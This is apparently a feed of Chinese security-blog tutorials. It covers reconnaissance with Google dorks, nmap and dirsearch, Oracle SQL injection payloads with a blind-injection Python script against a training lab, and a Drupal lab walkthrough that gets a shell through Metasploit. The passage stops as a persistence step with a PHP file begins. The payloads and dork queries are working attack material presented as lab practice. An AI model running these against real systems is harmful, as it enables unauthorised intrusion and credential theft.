class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">intext： 寻找正文中含有关键字的网页，例如：intext：后台登陆 将只返回正文中包含后台登陆的wang网页。</span><br><span class="line"></span><br><span class="line">intitle： 寻找标题中含有关键字的网页，例如：intitle：后台登陆 密码 将返回标题中包含黑客而正文中包含中国的网页。</span><br><span class="line"></span><br><span class="line">allintitle： 用法和intitle类似，只不过可以指定多个词，例如：alltitle：后台登陆 管理员 将返回标题中包含后台登陆和管理员的网页。</span><br><span class="line"></span><br><span class="line">cache: 网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:www.hackingspirits.com guest ，将返回指定网站的缓存，并且正文中含有guest</span><br><span class="line"></span><br><span class="line">inurl： 将返回url中含有关键词的网页,例如：inurl：Login 将返回url中含有Login的网页。</span><br><span class="line"></span><br><span class="line">inininurl：//admin/login.php 查找管理员登陆页面</span><br><span class="line"></span><br><span class="line">nurl:/phpmyadmin/index.php 查找后台数据库管理页面</span><br><span class="line"></span><br><span class="line">allinurl 用法和inurl类似，只不过可以指定多个词，例如：inrul:Login admin 将返回url中含有Login和admin的网页。</span><br><span class="line"></span><br><span class="line">site 指定访问的站点，例如：site:baidu.com inurl:Login 将只在baidu.com中查找url中含有Login的网页。</span><br><span class="line"></span><br><span class="line">filetype 指定访问的文件类型，例如:site:baidu.com filetype:pdf 将只fan返回baidu.com站点上文件类型为pdf的网页。</span><br><span class="line"></span><br><span class="line">link 指定链接的网页，例如：link:www.baidu.com 将返回所有包含指向www.baidu.com的网页。</span><br><span class="line"></span><br><span class="line">info 返回站点的指定信息，例如：info:www.baidu.com 将返回百度的一些信息。</span><br><span class="line"></span><br><span class="line">Index  of   可以帮助你寻找网络和FTP目录  例如：index  of mp3</span><br><span class="line"></span><br><span class="line">查找网站后台：</span><br><span class="line"></span><br><span class="line">site:xxx.com intext:管理</span><br><span class="line"></span><br><span class="line">site:xxx.com inurl:login</span><br><span class="line"></span><br><span class="line">site:xxx.com intitle:后台</span><br><span class="line"></span><br><span class="line">查看服务器使用的程序：</span><br><span class="line"></span><br><span class="line">site:xxx.com filetype:asp</span><br><span class="line"></span><br><span class="line">site:xxx.com filetype:php</span><br><span class="line"></span><br><span class="line">site:xxx.com filetype:jsp</span><br><span class="line"></span><br><span class="line">site:xxx.com filetype:aspx</span><br><span class="line"></span><br><span class="line">查看上传漏洞：</span><br><span class="line"></span><br><span class="line">site:xxx.com inurl:file</span><br><span class="line"></span><br><span class="line">site:xxx.com inurl:load</span><br></pre></td></tr></table></figure><h5><span id="5端口扫描">5，端口扫描</span></h5><p>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。</p><p>在线端口扫描：<a href="http://www.all-tool.cn/Tools/portblast/">http://www.all-tool.cn/Tools/portblast/</a></p><p>​<a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p>nmap扫描端口和探测端口信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -sT 92.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -Pn -A -sC 192.168.0.2</span><br><span class="line"></span><br><span class="line">nmap -sU -sT -p0-65535 192.168.122.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用于扫描目标主机服务版本号与开放的端口</p><p>如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL ip.txt</span><br></pre></td></tr></table></figure><p>来扫描列表中所有的ip。</p><p>Nmap为端口探测最常用的方法，操作方便，输出结果非常直观。</p><p>常见的端口和攻击方法</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042019174.png" alt="image-20240104201950814" style="zoom:150%;"><h5><span id="6扫描敏感目录x2f文件">6，扫描敏感目录&#x2F;文件</span></h5><p>扫描敏感目录需要强大的字典，需要平时积累，拥有强大的字典能够更高效地找出网站的管理后台，敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等，这一步一半交给各类扫描器就可以了，将目标站点输入到域名中，选择对应字典类型，就可以开始扫描了，十分方便。</p><p>dirsearch</p><p>下载地址：<a href="https://gitee.com/Abaomianguan/dirsearch.git">https://gitee.com/Abaomianguan/dirsearch.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://m.scabjd.com/ -e *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042024201.png" alt="image-20240104202457984"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042025881.png" alt="image-20240104202506813"></p><p>御剑</p><p>下载地址：<a href="https://www.fujieace.com/hacker/tools/yujian.html">https://www.fujieace.com/hacker/tools/yujian.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042026738.png" alt="image-20240104202640356"></p><h5><span id="7指纹识别cms">7，指纹识别（CMS）</span></h5><p>1.什么是指纹（CMS）<br>CMS：快速搭建网站的内容管理系统，系统模板</p><p>Web应用框架：快速二次开发的Web应用框架，例如网站，小程序</p><p>2.指纹识别的方式<br>云溪在线指纹识别： <a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></p><p>Whatweb： <a href="http://www.whatweb.net/">http://www.whatweb.net</a></p><p>潮汐指纹: <a href="http://finger.tidesec.net/">http://finger.tidesec.net</a></p><p>插件: wappalyzer <a href="https://www.wappalyzer.com/">https://www.wappalyzer.com</a> 非常好用，可以直接插件搜索</p><p>脚本： CMSeek <a href="https://github.com/Tuhinshubhra/CMSeek">https://github.com/Tuhinshubhra/CMSeek</a></p><p>Webfinger <a href="https://github.com/se55i0n/Webfinger">https://github.com/se55i0n/Webfinger</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042030416.png" alt="image-20240104203007845"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;简介&quot;&gt;简介&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;渗透的本质是信息收集，信息收集也叫做资产收集&lt;/p&gt;
&lt;p&gt;信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十二，Oracle中SQL注入</title>
    <link href="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/</id>
    <published>2024-01-04T11:17:06.000Z</published>
    <updated>2024-01-04T11:19:16.689Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="oracle-sql注入">Oracle SQL注入</span></h4><h5><span id="1oracle数据库介绍">1，Oracle数据库介绍：</span></h5><p>Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。</p><p>Oracle服务默认端口：1521</p><p>Oracle和MySQL数据库语法大致相同，结构不太相同。</p><h5><span id="2oracle和mysql的语法差异">2，Oracle和MySQL的语法差异：</span></h5><ul><li><p>Oracle要求select后必须指明要查询的表名，可以用dual。</p><p>在Oracle中每个库中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位。</p><p>’a‘ 必须要和数据的类型一致，负责报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union selecct &#x27;a&#x27;,&#x27;b&#x27; from dual--+</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957150.png" alt="image-20240103193001440"></p><ul><li><p>Oracle使用 || 拼接字符串，MySQL中为或运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union selecct &#x27;a&#x27;||&#x27;a&#x27;,&#x27;b&#x27; from dual--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957231.png" alt="image-20240103193315338"></p></li><li><p>单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如sysdate，不能使用保留字作为用户定义的变量，但是当加上双引号就可以。</p></li><li><p>Oracle中没有空字符，’‘和’null’都是null，而MySQL中认为’’仍然是一个字符串。</p></li></ul><h5><span id="3oracle的重点系统表">3，Oracle的重点系统表</span></h5><p>– dba_tables : 系统里所有的表的信息，需要DBA权限才能查询<br>– all_tables : 当前用户有权限的表的信息<br>– user_tables: 当前用户名下的表的信息<br>– DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表<br>– ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表<br>– USER_ALL_TABLES：某一用户所拥有的对象和表</p><h5><span id="4oracle常用信息查询方法">4，oracle常用信息查询方法</span></h5><p>1、获取数据库版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#x27;Oracle%25&#x27;;</span><br><span class="line">&#x27;SELECT banner,null FROM v$version WHERE banner LIKE &#x27;Oracle%25&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957233.png" alt="image-20240103195721601"></p><p>2、获取操作系统版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#x27;TNS%25&#x27;;</span><br><span class="line">&#x27;SELECT banner,null FROM v$version WHERE banner LIKE &#x27;TNS%25&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958372.png" alt="image-20240103195739315"></p><p>3、获取当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM v$database;</span><br><span class="line">/全局数据库名</span><br><span class="line">&#x27; union select (SELECT global_name FROM global_name),null from dual --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958026.png" alt="image-20240103201603612"></p><p>4,获取数据库用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual;</span><br><span class="line">获取所有数据库用户</span><br><span class="line">SELECT username FROM all_users;</span><br><span class="line">SELECT name FROM sys.user$; -- 需要高权限</span><br></pre></td></tr></table></figure><p>6,获取当前用户权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM session_privs;</span><br></pre></td></tr></table></figure><p>7,获取当前用户有权限的所有数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner, table_name FROM all_tables;</span><br></pre></td></tr></table></figure><p>8,获取表，all_tables类似于MySQL中的information_schema.tables</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner, table_name FROM all_tables;</span><br></pre></td></tr></table></figure><p>9,获取字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM all_tab_columns;</span><br></pre></td></tr></table></figure><h5><span id="5通过burp-labs第六关">5,通过burp labs第六关</span></h5><p>1，确定闭合—‘单引号字符型闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">’--</span><br></pre></td></tr></table></figure><p>2，确定返回列数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 3</span><br><span class="line">order by 2</span><br></pre></td></tr></table></figure><p>3,找出所有表名称–<strong>USERS_AYGHUL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql：</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br><span class="line">oracle：</span><br><span class="line">SELECT table_name FROM all_tables;</span><br><span class="line">&#x27; union select table_name,null from all_tables--</span><br><span class="line">USERS_OQVBCS</span><br><span class="line">PASSWORD_HRMFUV</span><br><span class="line">USERNAME_PUGXDV</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958216.png" alt="image-20240103203034892"></p><p>4,找出该表的列名–<strong>USERNAME_UXMKVN</strong>,<strong>PASSWORD_XPUKYX</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql：</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br><span class="line">oracl:</span><br><span class="line">SELECT column_name FROM all_tab_columns;</span><br><span class="line">&#x27; union select column_name,null FROM all_tab_columns where table_name=&#x27;USERS_OQVBCS&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959463.png" alt="image-20240103203403152"></p><p>5,找出用户表中的所有数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql:</span><br><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br><span class="line">oracl:</span><br><span class="line">select name,password from users;</span><br><span class="line">&#x27; union select USERNAME_PUGXDV,PASSWORD_HRMFUV from USERS_OQVBCS--</span><br><span class="line">administrator</span><br><span class="line">kxiw0je1gupg2dxe5y1t</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959877.png" alt="image-20240103203810074"></p><p>6,登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959272.png" alt="image-20240103203934349"></p><h5><span id="6报错注入">6，报错注入</span></h5><p>报错注入常用函数：</p><p>1、utl_inaddr.get_host_name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p><p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p><p>2、ctxsys.drithsx.sn</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ctxsys.drithsx.sn(1, (select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>处理文本的函数，参数错误时会报错。</p><p>3、CTXSYS.CTX_REPORT.TOKEN_TYPE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#x27;123&#x27;) from dual;</span><br></pre></td></tr></table></figure><p>4、XMLType</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&#x27; and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --+</span><br></pre></td></tr></table></figure><p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</p><p>5、dbms_xdb_version.checkin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>6、dbms_xdb_version.makeversioned</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>7、dbms_xdb_version.uncheckout</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>8、dbms_utility.sqlid_to_sqlhash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>9、ordsys.ord_dicom.getmappingxpath</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br></pre></td></tr></table></figure><p>10、UTL_INADDR.get_host_name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure><p>11、UTL_INADDR.get_host_address</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;) from dual;</span><br></pre></td></tr></table></figure><h5><span id="7布尔盲注">7,布尔盲注</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and (SELECT substr(user,1,1)FROM dual) &gt;&#x27;!&#x27;--</span><br><span class="line">’ union select user,null from dual --</span><br></pre></td></tr></table></figure><p>通过decode配合除数为0来进行布尔盲注，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&#x27; and 1=(select decode(substr(user, 1, 1), &#x27;S&#x27;, (1/1),0) from dual) --+</span><br></pre></td></tr></table></figure><h5><span id="8时间盲注">8，时间盲注</span></h5><p>时间延迟函数：DBMS_PIPE.RECEIVE_MESSAGE()函数<br>dbms_pipe.receive_message(‘RDS’, 10) #将为从RDS管道返回的数据等待10秒。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE(&#x27;asd&#x27;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#x27;S&#x27;, 10))=1;</span><br></pre></td></tr></table></figure><p>还可以配合decode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;RDS&#x27;,10),0) from dual;</span><br></pre></td></tr></table></figure><p>python代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"># 忽略警告：当你的Python程序通过requests发送一个HTTPS请求但没有验证服务器证书时，urllib3会发出InsecureRequestWarning警告。</span><br><span class="line">resu=&#x27;Babbage Web Spray&#x27;</span><br><span class="line">name = &#x27;&#x27;</span><br><span class="line">url1 = &quot;https://0a0f0055049ec60881ee76b500e700ea.web-security-academy.net/filter?category=Pets&#x27;&quot;</span><br><span class="line">proxies = &#123;</span><br><span class="line">        &quot;http&quot;: &quot;http://127.0.0.1:7890&quot;,</span><br><span class="line">        &quot;http&quot;: &quot;https://127.0.0.1:7890&quot;,</span><br><span class="line">        &#125;</span><br><span class="line"># 代理</span><br><span class="line">for j in range(1, 10):</span><br><span class="line">    for i in range(65, 123):</span><br><span class="line">        url=url1+&quot; and (select substr(user,&quot;+str(j)+&quot;,1) from dual)=&#x27;&quot;+chr(i)+&quot;&#x27;--&quot;</span><br><span class="line">        response = requests.get(url=url,proxies=proxies,verify=False)</span><br><span class="line">        # SSL证书验证：服务器的SSL证书可能未被客户端信任。如果你确认可以接受不验证服务器证书的安全风险（仅限开发环境），可以在请求时添加verify=False参数</span><br><span class="line">        con = response.text</span><br><span class="line">        if resu in con:</span><br><span class="line">            name = name+chr(i)</span><br><span class="line">            print(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959534.png" alt="image-20240104094702412"></p><h5><span id="9oracle的decode函数">9,oracle的decode函数</span></h5><p><a href="https://blog.csdn.net/weixin_44185837/article/details/106036172?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170428822716800225594404%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170428822716800225594404&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-106036172-null-null.142%5Ev99%5Econtrol&utm_term=oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84decode%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_44185837/article/details/106036172?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170428822716800225594404%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170428822716800225594404&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-106036172-null-null.142^v99^control&amp;utm_term=oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84decode%E5%87%BD%E6%95%B0&amp;spm=1018.2226.3001.4187</a></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;oracle-sql注入&quot;&gt;Oracle SQL注入&lt;/span&gt;&lt;/h4&gt;&lt;h5&gt;&lt;span id=&quot;1oracle数据库介绍&quot;&gt;1，Oracle数据库介绍：&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;Oracle数据库系统是世界上流行的关系数据库管理系统，系统可</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十一，通过IP获得服务器权限</title>
    <link href="http://example.com/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/"/>
    <id>http://example.com/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/</id>
    <published>2024-01-01T08:28:46.000Z</published>
    <updated>2024-01-01T10:18:10.683Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="1获得ip地址">1，获得IP地址</span></h4><p>靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&gt;网络适配器—&gt;高级，找到MAC地址为:00:0C:29:60:07:93</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011635539.png" alt="image-20240101163424971" style="zoom:80%;"><p>先查看当前Kali的IP为：192.168.2.100</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011642206.png" alt="image-20240101164133597" style="zoom:80%;"><p>在Kali中ping</p><p>该网段中的所有存在的地址，并对比MAC地址，找到靶机的IP为：192.168.2.119</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.2.100/24</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011700091.png" alt="image-20240101170049669" style="zoom:80%;"><h4><span id="2扫描靶机的ip有哪些开放的端口">2，扫描靶机的IP有哪些开放的端口</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map -p1-500 -v 192.168.2.119</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011814075.png" alt="image-20240101170542451" style="zoom:80%;"><p>通过上图可以看到，靶机开放了22，80，111三个端口，其中80端口时http服务端口，用浏览器打开看看</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011710382.png" alt="image-20240101170756980"></p><p>尝试用admin-admin&#x2F;admin123等弱密码登录，无法成功</p><h4><span id="3目录扫描寻找有关漏洞信息的文件">3，目录扫描，寻找有关漏洞信息的文件</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.2.119&quot; -x 403,404 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011722855.png" alt="image-20240101172225232"></p><p>将以上文件在浏览器中打开看看</p><p>在<a href="http://192.168.2.119/UPGRADE.txt%E4%B8%AD%E5%8F%91%E7%8E%B0">http://192.168.2.119/UPGRADE.txt中发现</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011724642.png" alt="image-20240101172428761"></p><p>发现该网站是用Drupal技术搭建的，且版本为7.10之前</p><p>去官网查看版本，发现这是2015年的版本了，说明其可能存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011728657.png" alt="image-20240101172813357"></p><h4><span id="4用msfconsole获得shell">4，用msfconsole获得shell</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole打开msfconsole</span><br><span class="line">search drupal查看drupal有哪些漏洞</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011731742.png" alt="image-20240101173155499"></p><p>在以上漏洞中，我们选择2016年及其之后的使用</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011737423.png" alt="image-20240101173717721"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011739915.png" alt="image-20240101173837046"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011741041.png" alt="image-20240101174143572"></p><h4><span id="5权限维持">5,权限维持</span></h4><p>在Kali中创建1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span 